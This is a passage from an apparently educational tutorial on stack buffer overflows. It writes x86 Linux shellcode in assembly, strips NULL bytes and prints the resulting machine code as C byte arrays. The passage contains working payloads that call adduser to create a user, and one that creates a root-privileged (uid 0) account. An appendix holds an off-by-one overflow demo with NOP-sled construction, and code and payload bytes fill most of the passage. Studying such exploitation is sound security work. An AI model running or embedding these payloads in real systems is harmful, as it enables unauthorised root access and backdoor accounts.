	<span class="nf">movl</span> <span class="kc">$</span><span class="mh">0x1</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>        <span class="err">#</span> <span class="nv">Begin</span> <span class="nv">of</span> <span class="nv">Error</span> <span class="nv">Handling</span>
	<span class="nf">movl</span> <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">%</span><span class="nb">ebx</span>
	<span class="nf">int</span> <span class="kc">$</span><span class="mh">0x80</span>
<span class="nl">data:</span>
	<span class="nf">call</span> <span class="nv">start</span>            <span class="err">#</span> <span class="nv">Put</span> <span class="nv">base</span> <span class="nv">address</span> <span class="nv">of</span> <span class="nv">Strings</span> <span class="nv">on</span> <span class="nv">the</span> <span class="nv">Stack</span>
<span class="nf">.string</span> <span class="err">\"</span><span class="o">/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">sbin</span><span class="o">/</span><span class="nv">adduser#markus#</span><span class="o">-</span><span class="nv">p#$1$7</span><span class="err">Ï</span><span class="nv">v</span><span class="err">Ù</span><span class="nv">LK</span><span class="err">Ïµ</span><span class="kc">$</span><span class="nb">gS</span><span class="nv">UKG6RALzRA8ryROcTsG0#</span><span class="err">\"</span></code></pre></figure> <p></p> <p>When placing the strings, remember that an extra byte is needed to mark the end of each string. In this example, the <code class="language-plaintext highlighter-rouge">#</code> character is used as a placeholder for the string terminator.</p> <p>However, when testing this code, you might notice that the C function <code class="language-plaintext highlighter-rouge">strcpy()</code> does not copy the entire code into the overflow buffer. The reason is straightforward: There are <strong>NULL bytes</strong> present in the code. Since <code class="language-plaintext highlighter-rouge">strcpy()</code> stops copying as soon as it encounters a <code class="language-plaintext highlighter-rouge">\0</code>, any subsequent code is ignored. This effectively renders the code unusable.</p> <p>To solve this problem, <strong>all NULL bytes must be removed</strong>. But because the strings themselves require termination bytes, a different approach must be used. Here, an important principle from Boolean algebra becomes relevant:</p> \[x \nleftrightarrow x = 0\] <p>Therefore, a register can be set to zero with a simple XOR operation and then written to the corresponding memory locations. This changes the code as follows:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">jmp</span> <span class="nv">data</span>
<span class="nl">start:</span>
	<span class="nf">popl</span> <span class="o">%</span><span class="nb">esi</span>             <span class="err">#</span> <span class="nv">Base</span> <span class="nv">Address</span> <span class="nv">der</span> <span class="nv">Strings</span> <span class="nv">vom</span> <span class="nv">Stack</span> <span class="nv">holen</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">esi</span><span class="p">,</span><span class="mi">63</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="nv">for</span> <span class="nv">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> 		
	<span class="nf">leal</span> <span class="mi">18</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="nv">for</span> <span class="nv">name</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="mi">67</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>			
	<span class="nf">leal</span> <span class="mi">25</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="nv">for</span> <span class="nv">name</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="mi">71</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>		
	<span class="nf">leal</span> <span class="mi">28</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="nv">for</span> <span class="nv">name</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="mi">75</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>
	<span class="nf">xorl</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>        <span class="err">#</span> <span class="nv">Null</span> <span class="nv">the</span> <span class="nb">EAX</span> <span class="nv">register</span>		
	<span class="nf">movb</span> <span class="o">%</span><span class="nb">al</span><span class="p">,</span><span class="mi">17</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>     <span class="err">#</span> <span class="nv">Termination</span> <span class="nv">of</span> <span class="nv">the</span> <span class="nv">Strings</span> <span class="p">(</span><span class="nv">one</span> <span class="kt">byte</span> <span class="nv">each</span><span class="p">)</span>
	<span class="nf">movb</span> <span class="o">%</span><span class="nb">al</span><span class="p">,</span><span class="mi">24</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>
	<span class="nf">movb</span> <span class="o">%</span><span class="nb">al</span><span class="p">,</span><span class="mi">27</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>
	<span class="nf">movb</span> <span class="o">%</span><span class="nb">al</span><span class="p">,</span><span class="mi">62</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="mi">79</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>    <span class="err">#</span> <span class="nv">NULL</span><span class="o">-</span><span class="nv">Pointer</span> <span class="nv">at</span> <span class="nv">end</span> <span class="nv">of</span> <span class="nv">pointer</span> <span class="nv">list</span>
	<span class="nf">movb</span> <span class="kc">$</span><span class="mh">0xb</span><span class="p">,</span><span class="o">%</span><span class="nb">al</span>         <span class="err">#</span> <span class="nv">Code</span> <span class="nv">of</span> <span class="nv">SysCall</span><span class="o">-</span><span class="nv">table</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">esi</span><span class="p">,</span><span class="o">%</span><span class="nb">ebx</span>        <span class="err">#</span> <span class="nv">Address</span> <span class="nv">of</span> <span class="nv">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
	<span class="nf">leal</span> <span class="mi">63</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">),</span><span class="o">%</span><span class="nb">ecx</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="p">[</span><span class="nv">A</span><span class="p">]</span> <span class="nv">to</span> <span class="nb">ECX</span> <span class="p">(</span><span class="nv">name</span><span class="p">[])</span>
	<span class="nf">leal</span> <span class="mi">79</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">),</span><span class="o">%</span><span class="nb">edx</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="nv">of</span> <span class="nv">null</span> <span class="nv">pointer</span> <span class="nv">to</span> <span class="nb">EDX</span>
	<span class="nf">int</span> <span class="kc">$</span><span class="mh">0x80</span>             <span class="err">#</span> <span class="nv">Trigger</span> <span class="nv">Interrupt</span>
	<span class="nf">xorl</span> <span class="o">%</span><span class="nb">ebx</span><span class="p">,</span><span class="o">%</span><span class="nb">ebx</span>	      <span class="err">#</span> <span class="nv">Begin</span> <span class="nv">of</span> <span class="nv">Error</span> <span class="nv">Handling</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">ebx</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
	<span class="nf">inc</span> <span class="o">%</span><span class="nb">eax</span>
	<span class="nf">int</span> <span class="kc">$</span><span class="mh">0x80</span>
<span class="nl">data:</span>
	<span class="nf">call</span> <span class="nv">start</span>            <span class="err">#</span> <span class="nv">Put</span> <span class="nv">base</span> <span class="nv">address</span> <span class="nv">of</span> <span class="nv">Strings</span> <span class="nv">on</span> <span class="nv">the</span> <span class="nv">Stack</span>
<span class="nf">.string</span> <span class="err">\"</span><span class="o">/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">sbin</span><span class="o">/</span><span class="nv">adduser#markus#</span><span class="o">-</span><span class="nv">p#$1$7</span><span class="err">Ï</span><span class="nv">v</span><span class="err">Ù</span><span class="nv">LK</span><span class="err">Ïµ</span><span class="kc">$</span><span class="nb">gS</span><span class="nv">UKG6RALzRA8ryROcTsG0#</span><span class="err">\"</span></code></pre></figure> <p></p> <h2 id="assembling-the-program-and-extracting-the-machine-code">Assembling the program and extracting the machine code</h2> <p>After assembly, the machine code can be read out using the GDB debugger. This should be used next to create an exploit. The size of the code is exactly 128 bytes.</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
	<span class="s">"</span><span class="se">\xeb\x3a\x5e\x89\x76\x3f\x8d\x46</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x12\x89\x46\x43\x8d\x46\x19\x89</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x46\x47\x8d\x46\x1c\x89\x46\x4b</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x31\xc0\x88\x46\x11\x88\x46\x18</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x88\x46\x1b\x88\x46\x3e\x89\x46</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x4f\xb0\x0b\x89\xf3\x8d\x4e\x3f</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x8d\x56\x4f\xcd\x80\x31\xdb\x89</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\xd8\x40\xcd\x80\xe8\xc1\xff\xff</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\xff\x2f\x75\x73\x72\x2f\x73\x62</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x69\x6e\x2f\x61\x64\x64\x75\x73</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x65\x72\x23\x6d\x61\x72\x6b\x75</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x73\x23\x2d\x70\x23\x24\x31\x24</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x37\xcf\x76\xd9\x4c\x4b\xcf\xb5</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x24\x67\x53\x55\x4b\x47\x36\x52</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x41\x4c\x7a\x52\x41\x38\x72\x79</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x52\x4f\x63\x54\x73\x47\x30\x23</span><span class="s">"</span><span class="p">;</span></code></pre></figure> <p></p> <h2 id="creating-a-fully-functional-exploit">Creating a fully Functional Exploit</h2> <p>The goal of this exploit is to overflow the vulnerable program’s 512-byte buffer while making optimal use of the available space. Since our shellcode is only 128 bytes long, we have over 384 remaining bytes to occupy—an ideal scenario for implementing a <strong>NOP-sled</strong>. Additionally, we need to estimate the payload’s address so we can overwrite the function’s return address successfully.</p> <p>Given that the payload address is only a rough approximation, using a sufficiently large NOP region increases the likelihood of landing within that region and subsequently executing the shellcode. We will not discuss the C program that generates the exploit here, but you can find extensively documented source code on GitHub.</p> <p>Up to this point, our shellcode only creates a non-privileged user named <strong>markus</strong>. To create a <strong>root-privileged</strong> user, we would need an extended parameter list for the <code class="language-plaintext highlighter-rouge">useradd</code> program. The shellcode’s overall structure remains the same, so we will not delve into additional details; the code is simply listed below:</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="err">`</span><span class="n">main</span><span class="p">()</span><span class="err">`</span> <span class="p">{</span>
   <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">[</span><span class="mi">9</span><span class="p">];</span>
   <span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s">"/usr/sbin/adduser"</span><span class="p">;</span>
   <span class="n">name</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span><span class="s">"-u"</span><span class="p">;</span>
   <span class="n">name</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="s">"0"</span><span class="p">;</span>
   <span class="n">name</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="s">"-g"</span><span class="p">;</span>
   <span class="n">name</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="s">"root"</span><span class="p">;</span>
   <span class="n">name</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="s">"-p"</span>
   <span class="n">name</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="s">"$1$7ÏvÙLKÏµ$gSUKG6RALzRA8ryROcTsG0;</span><span class="err">
</span><span class="s">   name[7] = "</span><span class="n">rut</span><span class="s">";</span><span class="err">
</span><span class="s">   name[8] = NULL;</span><span class="err">
</span><span class="s">   execve(name[0], name, NULL);</span><span class="err">
</span><span class="s">}</span></code></pre></figure> <p> which leads to the following machine code:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">char</span> <span class="kt">byte</span><span class="nv">Code</span><span class="p">[]</span> <span class="err">=</span>
	<span class="err">"\</span><span class="nf">xeb</span><span class="err">\</span><span class="nv">x67</span><span class="err">\</span><span class="nv">x5e</span><span class="err">\</span><span class="nv">x89</span><span class="err">\</span><span class="nv">x76</span><span class="err">\</span><span class="nv">x4c</span><span class="err">\</span><span class="nv">x8d</span><span class="err">\</span><span class="nv">x46</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x12</span><span class="err">\</span><span class="nv">x89</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x50</span><span class="err">\</span><span class="nv">x8d</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x15</span><span class="err">\</span><span class="nv">x89</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x54</span><span class="err">\</span><span class="nv">x8d</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x17</span><span class="err">\</span><span class="nv">x89</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x58</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x8d</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x1a</span><span class="err">\</span><span class="nv">x89</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x5c</span><span class="err">\</span><span class="nv">x8d</span><span class="err">\</span><span class="nv">x46</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x1d</span><span class="err">\</span><span class="nv">x89</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x60</span><span class="err">\</span><span class="nv">x8d</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x22</span><span class="err">\</span><span class="nv">x89</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x64</span><span class="err">\</span><span class="nv">x8d</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x25</span><span class="err">\</span><span class="nv">x89</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x68</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x8d</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x48</span><span class="err">\</span><span class="nv">x89</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x6c</span><span class="err">\</span><span class="nv">x31</span><span class="err">\</span><span class="nv">xc0</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x88</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x11</span><span class="err">\</span><span class="nv">x88</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x14</span><span class="err">\</span><span class="nv">x88</span><span class="err">\</span><span class="nv">x46</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x16</span><span class="err">\</span><span class="nv">x88</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x19</span><span class="err">\</span><span class="nv">x88</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x1c</span><span class="err">\</span><span class="nv">x88</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x21</span><span class="err">\</span><span class="nv">x88</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x24</span><span class="err">\</span><span class="nv">x88</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x47</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x88</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x4b</span><span class="err">\</span><span class="nv">x89</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x70</span><span class="err">\</span><span class="nv">xb0</span><span class="err">\</span><span class="nv">x0b</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x89</span><span class="err">\</span><span class="nv">xf3</span><span class="err">\</span><span class="nv">x8d</span><span class="err">\</span><span class="nv">x4e</span><span class="err">\</span><span class="nv">x4c</span><span class="err">\</span><span class="nv">x8d</span><span class="err">\</span><span class="nv">x56</span><span class="err">\</span><span class="nv">x70</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">xcd</span><span class="err">\</span><span class="nv">x80</span><span class="err">\</span><span class="nv">x31</span><span class="err">\</span><span class="nv">xdb</span><span class="err">\</span><span class="nv">x89</span><span class="err">\</span><span class="nv">xd8</span><span class="err">\</span><span class="nv">x40</span><span class="err">\</span><span class="nv">xcd</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x80</span><span class="err">\</span><span class="nv">xe8</span><span class="err">\</span><span class="nv">x94</span><span class="err">\</span><span class="nv">xff</span><span class="err">\</span><span class="nv">xff</span><span class="err">\</span><span class="nv">xff</span><span class="err">\</span><span class="nv">x2f</span><span class="err">\</span><span class="nv">x75</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x73</span><span class="err">\</span><span class="nv">x72</span><span class="err">\</span><span class="nv">x2f</span><span class="err">\</span><span class="nv">x73</span><span class="err">\</span><span class="nv">x62</span><span class="err">\</span><span class="nv">x69</span><span class="err">\</span><span class="nv">x6e</span><span class="err">\</span><span class="nv">x2f</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x61</span><span class="err">\</span><span class="nv">x64</span><span class="err">\</span><span class="nv">x64</span><span class="err">\</span><span class="nv">x75</span><span class="err">\</span><span class="nv">x73</span><span class="err">\</span><span class="nv">x65</span><span class="err">\</span><span class="nv">x72</span><span class="err">\</span><span class="nv">x23</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x2d</span><span class="err">\</span><span class="nv">x75</span><span class="err">\</span><span class="nv">x23</span><span class="err">\</span><span class="nv">x30</span><span class="err">\</span><span class="nv">x23</span><span class="err">\</span><span class="nv">x2d</span><span class="err">\</span><span class="nv">x6f</span><span class="err">\</span><span class="nv">x23</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x2d</span><span class="err">\</span><span class="nv">x67</span><span class="err">\</span><span class="nv">x23</span><span class="err">\</span><span class="nv">x72</span><span class="err">\</span><span class="nv">x6f</span><span class="err">\</span><span class="nv">x6f</span><span class="err">\</span><span class="nv">x74</span><span class="err">\</span><span class="nv">x23</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x2d</span><span class="err">\</span><span class="nv">x70</span><span class="err">\</span><span class="nv">x23</span><span class="err">\</span><span class="nv">x24</span><span class="err">\</span><span class="nv">x31</span><span class="err">\</span><span class="nv">x24</span><span class="err">\</span><span class="nv">x37</span><span class="err">\</span><span class="nv">xcf</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x76</span><span class="err">\</span><span class="nv">xd9</span><span class="err">\</span><span class="nv">x4c</span><span class="err">\</span><span class="nv">x4b</span><span class="err">\</span><span class="nv">xcf</span><span class="err">\</span><span class="nv">xb5</span><span class="err">\</span><span class="nv">x24</span><span class="err">\</span><span class="nv">x67</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x53</span><span class="err">\</span><span class="nv">x55</span><span class="err">\</span><span class="nv">x4b</span><span class="err">\</span><span class="nv">x47</span><span class="err">\</span><span class="nv">x36</span><span class="err">\</span><span class="nv">x52</span><span class="err">\</span><span class="nv">x41</span><span class="err">\</span><span class="nv">x4c</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x7a</span><span class="err">\</span><span class="nv">x52</span><span class="err">\</span><span class="nv">x41</span><span class="err">\</span><span class="nv">x38</span><span class="err">\</span><span class="nv">x72</span><span class="err">\</span><span class="nv">x79</span><span class="err">\</span><span class="nv">x52</span><span class="err">\</span><span class="nv">x4f</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x63</span><span class="err">\</span><span class="nv">x54</span><span class="err">\</span><span class="nv">x73</span><span class="err">\</span><span class="nv">x47</span><span class="err">\</span><span class="nv">x30</span><span class="err">\</span><span class="nv">x23</span><span class="err">\</span><span class="nv">x72</span><span class="err">\</span><span class="nv">x75</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x74</span><span class="err">\</span><span class="nv">x23</span><span class="err">"</span><span class="c1">;</span></code></pre></figure> <p></p> <h1 id="appendix">Appendix</h1> <h2 id="example-for-off-by-ones-overflows">Example for Off-By-Ones Overflows</h2> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/errno.h&gt;</span><span class="cp">
</span>
<span class="cp">#define DEFAULT_OFFSET  500 - 32
#define DEFAULT_BUFFER  521
#define NOP             0x90
</span>
<span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
    <span class="s">"</span><span class="se">\xeb\x3a\x5e\x89\x76\x3f\x8d\x46</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x12\x89\x46\x43\x8d\x46\x19\x89</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x46\x47\x8d\x46\x1c\x89\x46\x4b</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x31\xc0\x88\x46\x11\x88\x46\x18</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x88\x46\x1b\x88\x46\x3e\x89\x46</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x4f\xb0\x0b\x89\xf3\x8d\x4e\x3f</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x8d\x56\x4f\xcd\x80\x31\xdb\x89</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xd8\x40\xcd\x80\xe8\xc1\xff\xff</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xff\x2f\x75\x73\x72\x2f\x73\x62</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x69\x6e\x2f\x61\x64\x64\x75\x73</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x65\x72\x23\x6d\x61\x72\x6b\x75</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x73\x23\x2d\x70\x23\x24\x31\x24</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x37\xcf\x76\xd9\x4c\x4b\xcf\xb5</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x24\x67\x53\x55\x4b\x47\x36\x52</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x41\x4c\x7a\x52\x41\x38\x72\x79</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x52\x4f\x63\x54\x73\x47\x30\x23</span><span class="s">"</span><span class="p">;</span>

<span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">getESP</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">__asm__</span><span class="p">(</span><span class="s">"movl %esp,%eax"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">calc</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">bb</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="c1">// Because too much memory is allocated (GCC bug),</span>
    <span class="c1">// let the loop run a bit further. Even so, only</span>
    <span class="c1">// the lower byte of the saved frame pointer (SFP) is overwritten!!!</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">520</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="n">bb</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">str</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>

    <span class="n">bb</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">bb</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">calctmp</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// The call does not happen directly from main,</span>
    <span class="c1">// but via an intermediate function. Why???</span>
    <span class="c1">// The SFP in main is too large and therefore cannot be reached.</span>
    <span class="c1">// Check whether this might be related to argc, argv, and envp.</span>
    <span class="c1">// char arr[33];</span>
    <span class="n">calc</span><span class="p">(</span><span class="n">str</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="c1">// char dummy[1];</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">buff</span><span class="p">,</span> <span class="o">*</span><span class="n">tmp</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">DEFAULT_OFFSET</span><span class="p">,</span> <span class="n">buffs</span> <span class="o">=</span> <span class="n">DEFAULT_BUFFER</span><span class="p">,</span> <span class="n">i</span><span class="p">;</span>
    <span class="kt">long</span> <span class="n">adr</span><span class="p">,</span> <span class="o">*</span><span class="n">adr_pointer</span><span class="p">;</span>

    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>
        <span class="n">offset</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>

    <span class="n">buff</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">buffs</span><span class="p">);</span>    <span class="c1">// Reserve memory on the heap</span>

    <span class="n">adr</span> <span class="o">=</span> <span class="n">getESP</span><span class="p">()</span> <span class="o">-</span> <span class="n">offset</span><span class="p">;</span>
    <span class="n">tmp</span> <span class="o">=</span> <span class="n">buff</span><span class="p">;</span>
    <span class="n">adr_pointer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span><span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>  <span class="c1">// +1 because the stack is set up incorrectly</span>

    <span class="c1">// Fill the entire buffer with the suspected address</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">buffs</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">)</span>
        <span class="o">*</span><span class="p">(</span><span class="n">adr_pointer</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">adr</span><span class="p">;</span>

    <span class="c1">// Fill the first half with NOPs</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">buffs</span><span class="o">/</span><span class="mi">2</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="n">buff</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">NOP</span><span class="p">;</span>

    <span class="n">tmp</span> <span class="o">=</span> <span class="n">buff</span> <span class="o">+</span> <span class="p">((</span><span class="n">buffs</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">));</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="o">*</span><span class="p">(</span><span class="n">tmp</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>

    <span class="n">buff</span><span class="p">[</span><span class="n">buffs</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// Off-by-one byte</span>

    <span class="n">calctmp</span><span class="p">(</span><span class="n">buff</span><span class="p">);</span>

    <span class="cm">/*
